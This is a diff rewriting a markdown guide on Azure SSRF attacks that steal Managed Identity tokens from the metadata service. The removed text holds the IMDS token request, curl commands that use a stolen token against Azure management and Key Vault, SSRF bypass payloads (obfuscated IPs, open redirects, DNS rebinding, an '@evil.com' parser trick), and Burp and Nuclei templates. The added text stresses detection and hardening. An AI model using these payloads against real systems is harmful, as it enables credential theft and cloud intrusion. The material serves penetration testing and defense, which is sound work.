@@ -1,340 +1,325 @@
-# Azure SSRF → Managed Identity Credential Theft
+# Azure SSRF → Managed Identity Token Theft
 
-**💡 Context**
+## Overview
 
-- In Azure, **Instance Metadata Service (IMDS)** provides tokens for
-  **Managed Identities** (user-assigned or system-assigned).
+Azure workloads that use **Managed Identities** obtain OAuth 2.0 access tokens from the **Azure Instance Metadata Service (IMDS)**.
 
-- IMDS is accessible via:
+If an attacker exploits a **Server-Side Request Forgery (SSRF)** vulnerability or gains **Remote Code Execution (RCE)** within an Azure-hosted workload, they may be able to request tokens from IMDS and impersonate the managed identity assigned to that resource.
 
-- http://169.254.169.254/metadata/identity/oauth2/token
+> **Important**
+>
+> Successfully obtaining a token **does not automatically grant administrative privileges**. The attacker only receives the permissions assigned to the managed identity. The impact depends entirely on the RBAC roles and application permissions granted to that identity.
 
-- By abusing **SSRF** or RCE in an Azure-hosted app (e.g., App Service,
-  Function, VM), an attacker can request access tokens tied to the
-  instance's managed identity.
+---
 
-## Azure SSRF Exploitation Flow
+### Azure Instance Metadata Service (IMDS)
 
-1.  **Locate a vulnerable service** (e.g., web app, function) that
-    allows **SSRF** or RCE.
+Azure IMDS is available from within Azure compute resources at:
 
-2.  **Craft a metadata token request**:
+```text
+http://169.254.169.254/metadata/
+```
 
-3.  GET
-    /metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com
+Managed Identity token endpoint:
 
-4.  Host: 169.254.169.254
-
-5.  Metadata: true
-
-6.  **Send request via SSRF or local RCE**.
-
-7.  **Extract access token** from response:
-
-8.  {
-
-9.  "access_token": "eyJ0eXAiOiJKV1Qi...",
-
-10. "expires_in": "3599",
-
-11. "token_type": "Bearer"
-
-12. }
-
-13. **Use token with Azure CLI or REST API**:
-
-14. az login --identity
-
-15. curl -H "Authorization: Bearer \<access_token\>"
-    https://management.azure.com/subscriptions?api-version=2020-01-01
-
-16. **Enumerate privileges**, pivot, or exfiltrate secrets:
-
-    - Access Key Vault: https://vault.azure.net
-
-    - Query Microsoft Graph: https://graph.microsoft.com
-
-    - Dump storage, secrets, or deploy further persistence
-
-## Defense (Blue Team Note)
-
-- **Restrict public exposure** of services handling user-supplied URLs
-  or request proxies.
-
-- **Enable App Service VNet Integration** and use **NSGs** to prevent
-  access to 169.254.169.254.
-
-- Use **Conditional Access**, **Defender for Cloud**, and **Managed
-  Identity least privilege**.
-
-**Detection Tips**
-
-- Monitor for unexpected access to 169.254.169.254 from applications.
-
-- Look for anomalous token use via Azure Activity Logs or Graph API
-  calls from app identities.
-
-## Checklist: Azure Services Vulnerable to SSRF-Based Metadata Theft
-
-Here’s a **checklist of Azure services** and components that are either
-**vulnerable to SSRF-based metadata theft** or have been **used in
-real-world attack chains** involving SSRF to steal Managed Identity
-tokens from the Instance Metadata Service (IMDS):
-
-**1. Azure Virtual Machines (VMs)**
-
-- **SSRF or RCE in VM-hosted app** can access IMDS at
-  http://169.254.169.254/metadata/identity/oauth2/token
-
-- **No network restrictions** by default
-
-**2. Azure App Services (Web Apps)**
-
-- Public-facing apps accepting URL input (e.g., image fetchers, webhook
-  relays)
-
-- Vulnerable SSRF allows access to IMDS
-
-- Token fetch endpoint:
-
-- <http://169.254.169.254/metadata/identity/oauth2/token>
-
-**3. Azure Functions**
-
-- Especially when used as backend APIs
-
-- SSRF or insecure deserialization can lead to token exposure
-
-- Often assigned **System-Assigned Managed Identity** for access to
-  Storage, Key Vault, etc.
-
-**4. Azure Container Instances (ACI)**
-
-- Access to IMDS over local IP is often enabled
-
-- Containers may expose web servers or APIs that are SSRF-prone
-
-**5. Azure Kubernetes Service (AKS)**
-
-- **Pods using Managed Identity (via AAD Pod Identity)** can be SSRF
-  targets
-
-- Exploiting apps within pods can yield tokens
-
-**6. Azure App Gateway with WAF**
-
-- Sometimes misconfigured to allow SSRF chaining through backend routing
-
-- Can be paired with vulnerable web apps to proxy token requests
-
-**7. Azure Logic Apps**
-
-- Improper use of HTTP connectors or webhook-based logic flows
-
-- May expose internal services that can be abused via SSRF
-
-## Known SSRF Exploitation Patterns in Azure
-
-| **Pattern** | **Impact** | **Example** |
-|----|----|----|
-| SSRF → IMDS | Steal Managed Identity token | Access Vault, Graph API, Storage |
-| SSRF via Open Redirect | Redirect attacker-controlled URL to IMDS | Proxy to 169.254.169.254 |
-| SSRF via Deserialization | App unpacks attacker-controlled object with URL fetch | Full RCE or internal HTTP access |
-| Proxy misconfig (e.g., nginx, appgateway) | Redirect to IMDS via X-Forwarded-Host trick | Confused proxy SSRF |
-
-**Suggested Hardening Controls**
-
-- **Block access to IMDS from app code** unless needed
-
-- Use **User-Assigned Managed Identities** with minimal scopes
-
-- Monitor apps with public input that can fetch remote URLs
-
-- Apply **NSGs or Azure Firewall** rules blocking 169.254.169.254 from
-  untrusted workloads
-
-- Implement **Content Security Policy (CSP)** in web apps where
-  applicable
-
-## Azure SSRF Testing Checklist
-
-### 1. Check for SSRF in Web Inputs
-
-- Image uploaders / fetchers
-
-- Webhook URLs
-
-- PDF generators
-
-- URL preview/metadata fetch tools
-
-- API endpoints that accept user-controlled URLs
-
-###  2. Attempt Metadata Service Access
-
-Try accessing the Azure Instance Metadata Service (IMDS):
-
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
-
-**Required Header:**
-
-Metadata: true
-
-###  3. Verify Token Exposure
-
-A successful SSRF may return:
-
-{
-
-"access_token": "eyJ0eXAiOiJKV1QiLCJh...",
-
-"expires_in": "3599",
-
-"token_type": "Bearer",
-
-"resource": "https://management.azure.com/"
-
-}
-
-Use this token to access Azure services:
-
-curl -H "Authorization: Bearer \<TOKEN\>"
-https://management.azure.com/subscriptions?api-version=2020-01-01
-
-###  4. Test Common SSRF Bypass Techniques
-
-| **Technique**     | **Example**                                           |
-|-------------------|-------------------------------------------------------|
-| DNS rebinding     | http://your.evil.server → resolves to 169.254.169.254 |
-| Obfuscated IPs    | http://0xA9FEA9FE or http://2130706433                |
-| Localhost aliases | http://localhost, http://127.0.0.1, http://\[::1\]    |
-| Headers overwrite | Add Host: 169.254.169.254                             |
-| Redirect chaining | Use an open redirect to forward to IMDS               |
-| Path confusion    | http://169.254.169.254@evil.com (trick parsers)       |
-
-###  5. Privilege Escalation Paths via Token Abuse
-
-- Access Azure Key Vault:
-
-- curl -H "Authorization: Bearer \<token\>" \\
-
-- https://\<vault-name\>.vault.azure.net/secrets?api-version=7.0
-
-- Access Storage Blobs:
-
-- https://\<storage\>.blob.core.windows.net/\<container\>?restype=container&comp=list
-
-- Enumerate Resource Groups / VMs / App Services
-
-###  6. Validate Environment Variables in SSRF Targets
-
-Look for exposed container metadata:
-
-http://169.254.170.2/v2/credentials
-
-From inside Azure Container Instances or App Services.
-
-## 🧪 SSRF Payload Examples
-
-\# Basic
-
+```text
 http://169.254.169.254/metadata/identity/oauth2/token
+```
 
-\# With resource and header
+Required HTTP header:
 
-curl -H "Metadata:true" \\
-
-"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"
-
-\# Open redirect abuse
-
-https://vulnerable.com/redirect?url=http://169.254.169.254/metadata/identity/oauth2/token
-
-\# DNS rebinding
-
-http://yourattackercontrolleddomain.com → points to metadata IP
-
-\# Obfuscated format
-
-http://0xA9FEA9FE/metadata/identity/oauth2/token
-
-## Detection & Prevention
-
-- Restrict outbound traffic to 169.254.169.254 via NSG or Azure Firewall
-
-- Validate URLs and restrict domains in user inputs
-
-- Use WAF rules to detect internal IP access patterns
-
-- Audit Managed Identity token usage via Azure AD logs
-
-## Burp Suite Repeater (Azure SSRF to Metadata Service)
-
-**📋 Request Template**
-
-GET
-/?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
-HTTP/1.1
-
-Host: vulnerable-azure-app.com
-
+```http
 Metadata: true
+```
 
-User-Agent: Mozilla/5.0
+---
 
-Modify the url parameter and Host as per your target.
+## Attack Flow
 
-**Success Indicator:**
+```text
+Internet
+     │
+     ▼
+Public Azure Application
+(App Service / Function / VM / Container)
+     │
+     ▼
+SSRF or RCE
+     │
+     ▼
+Azure IMDS
+169.254.169.254
+     │
+     ▼
+Managed Identity Access Token
+     │
+     ▼
+Azure Resource Manager
+Microsoft Graph
+Key Vault
+Storage
+Other Azure Services
+```
 
-Look for a 200 OK and response containing:
+---
 
-"access_token": "eyJ0eXAiOiJKV1QiLCJh..."
+## Attack Prerequisites
 
-\\
+The attack generally requires all of the following:
 
-## Nuclei Template (Azure SSRF IMDS Discovery)
+- An Azure-hosted workload with a **Managed Identity** enabled.
+- A vulnerable application allowing **SSRF**, **RCE**, or another method of making arbitrary HTTP requests.
+- Network connectivity from the workload to IMDS.
+- The managed identity possessing permissions that are useful to the attacker.
 
-id: azure-imds-ssrf
+---
 
-info:
+## Typical Attack Sequence
 
-name: Azure SSRF to IMDS Token Leak
+1. Discover a vulnerable Azure application.
+2. Exploit SSRF (or achieve RCE).
+3. Send a request to Azure IMDS requesting an access token.
+4. Receive the OAuth access token.
+5. Use the token to authenticate to Azure services.
+6. Enumerate permissions.
+7. Access resources permitted to the managed identity.
+8. Establish persistence or continue lateral movement if possible.
 
-author: pentester-labs
+---
 
-severity: high
+## Example IMDS Request
 
-description: Detects SSRF access to Azure Instance Metadata Service for
-token extraction
+```http
+GET /metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/ HTTP/1.1
+Host: 169.254.169.254
+Metadata: true
+```
 
-tags: azure,ssrf,imds
+---
 
-requests:
+## Example Response
 
-\- method: GET
+```json
+{
+  "access_token": "<JWT_TOKEN>",
+  "expires_in": "3599",
+  "token_type": "Bearer"
+}
+```
 
-path:
+---
 
-\-
-"{{BaseURL}}/?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+## Possible Post-Exploitation Activities
 
-headers:
+Depending on the permissions assigned to the managed identity, an attacker may be able to:
 
-Metadata: "true"
+- Enumerate Azure subscriptions
+- Enumerate resource groups
+- Read Azure Storage data
+- Read Azure Key Vault secrets
+- Query Microsoft Graph
+- Deploy Azure resources
+- Modify infrastructure
+- Access application secrets
+- Establish persistence
 
-matchers:
+---
 
-\- type: regex
+## Common Azure Services Exposed to IMDS Abuse
 
-regex:
+| Azure Service | Risk |
+|--------------|------|
+| Azure Virtual Machines | Applications running on the VM may expose SSRF or RCE that reaches IMDS. |
+| Azure App Service | Public-facing web applications are common SSRF targets. |
+| Azure Functions | HTTP-triggered functions may expose SSRF vulnerabilities. |
+| Azure Container Instances (ACI) | Containerized applications may be vulnerable to SSRF or RCE. |
+| Azure Kubernetes Service (AKS) | Applications running inside pods may abuse the node or workload identity configuration if compromised. |
+| Azure Logic Apps | HTTP connectors and webhook workflows can expose SSRF paths if poorly designed. |
 
-\- '"access_token"\s\*:\s\*".+?"'
+> Azure Application Gateway, Azure Front Door, Azure API Management, and reverse proxies are **not themselves vulnerable to IMDS theft**, but application or proxy misconfigurations can facilitate SSRF attacks against backend workloads.
 
-\- type: status
+---
 
-status:
+## Common SSRF Attack Patterns
 
-\- 200
+| Technique | Description | Potential Impact |
+|-----------|-------------|------------------|
+| Direct SSRF → IMDS | Application fetches attacker-controlled URL | Managed Identity token theft |
+| Open Redirect | Redirects internal request to IMDS | Token theft |
+| XXE | XML parser performs internal HTTP requests | Access to IMDS |
+| Deserialization | Gadget chain performs arbitrary HTTP requests | IMDS access or RCE |
+| RCE | Local code execution directly queries IMDS | Full access to managed identity |
 
-📌 Ensure the target has a vulnerable endpoint that reflects or uses the
-url parameter.
+---
+
+## High-Value Azure Resources Frequently Targeted
+
+After obtaining a token, attackers commonly attempt to access:
+
+- Azure Resource Manager (ARM)
+- Azure Key Vault
+- Azure Storage Accounts
+- Azure SQL
+- Azure Container Registry
+- Azure Cosmos DB
+- Microsoft Graph
+- Azure Event Hubs
+- Azure Service Bus
+
+---
+
+## Detection Opportunities
+
+Monitor for:
+
+- Requests to **169.254.169.254** originating from web applications.
+- Unexpected Managed Identity token requests.
+- Managed Identity authentication from unusual workloads.
+- Sudden enumeration of Azure resources.
+- Key Vault access by unexpected managed identities.
+- Unusual Microsoft Graph activity.
+- Storage enumeration immediately after IMDS access.
+- Privileged Azure Resource Manager API calls from application identities.
+
+Useful telemetry includes:
+
+- Azure Activity Logs
+- Microsoft Defender for Cloud
+- Microsoft Defender for Endpoint
+- Azure Monitor
+- Key Vault Diagnostic Logs
+- Microsoft Entra Sign-in Logs
+- Storage Diagnostic Logs
+
+---
+
+## Hardening Recommendations
+
+### Application Security
+
+- Validate and sanitize all user-supplied URLs.
+- Use strict allowlists for outbound HTTP requests.
+- Disable arbitrary URL fetching where possible.
+- Prevent open redirects.
+- Prevent XXE and unsafe deserialization.
+
+### Identity Security
+
+- Apply the principle of least privilege.
+- Prefer **User-Assigned Managed Identities** when appropriate.
+- Regularly review Managed Identity role assignments.
+- Remove unused managed identities.
+
+### Network Security
+
+- Restrict outbound network access where feasible.
+- Use Azure Firewall or Network Virtual Appliances to control egress.
+- Isolate workloads using Virtual Networks.
+- Avoid exposing unnecessary internal services.
+
+> **Note**
+>
+> Azure IMDS is a platform service and cannot be universally blocked with a simple NSG rule. Network controls should be carefully designed and validated to avoid disrupting legitimate Managed Identity functionality.
+
+### Monitoring
+
+- Enable Microsoft Defender for Cloud recommendations.
+- Alert on unusual Managed Identity activity.
+- Monitor Azure Resource Manager API usage.
+- Enable diagnostic logging for critical Azure services.
+
+---
+
+## SSRF Assessment Checklist
+
+### Identify Potential SSRF Entry Points
+
+- Image fetchers
+- URL preview services
+- Webhook endpoints
+- File import features
+- PDF generators
+- RSS readers
+- Proxy endpoints
+- URL validation APIs
+
+---
+
+### Test IMDS Access
+
+Target:
+
+```text
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/
+```
+
+Required header:
+
+```http
+Metadata: true
+```
+
+---
+
+### Verify Token Retrieval
+
+Successful responses typically contain:
+
+```json
+{
+  "access_token": "...",
+  "token_type": "Bearer",
+  "expires_in": "3599"
+}
+```
+
+---
+
+### Enumerate Identity Permissions
+
+After obtaining a token (during an authorized security assessment), determine what the managed identity can access, such as:
+
+- Azure Resource Manager
+- Azure Key Vault
+- Azure Storage
+- Microsoft Graph
+- Other Azure services permitted by its assigned roles
+
+---
+
+## Detection Indicators
+
+Potential indicators include:
+
+- HTTP requests to `169.254.169.254`
+- Unexpected Managed Identity token issuance
+- Abnormal Azure Resource Manager API usage
+- Unusual Key Vault access
+- Large-scale Azure resource enumeration
+- Storage account enumeration
+- Microsoft Graph activity from application identities
+- Sudden privilege changes or resource deployments
+
+---
+
+## MITRE ATT&CK Mapping
+
+| Tactic | Technique |
+| --------- | ----------- |
+| Initial Access | Exploit Public-Facing Application (T1190) |
+| Execution | Exploitation for Client Execution (T1203) *(when applicable)* |
+| Credential Access | Steal or Forge Authentication Tokens (T1528) |
+| Discovery | Cloud Service Discovery (T1526) |
+| Discovery | Permission Groups Discovery (T1069) |
+| Collection | Data from Cloud Storage (T1530) |
+| Lateral Movement | Valid Accounts (T1078) *(using the managed identity)* |
+| Persistence | Account Manipulation (T1098) *(if permissions allow)* |
+
+---
+
+## References
+
+- Azure Instance Metadata Service
+- Azure Managed Identity documentation
+- Microsoft Defender for Cloud recommendations
+- Microsoft Security Best Practices for Managed Identities
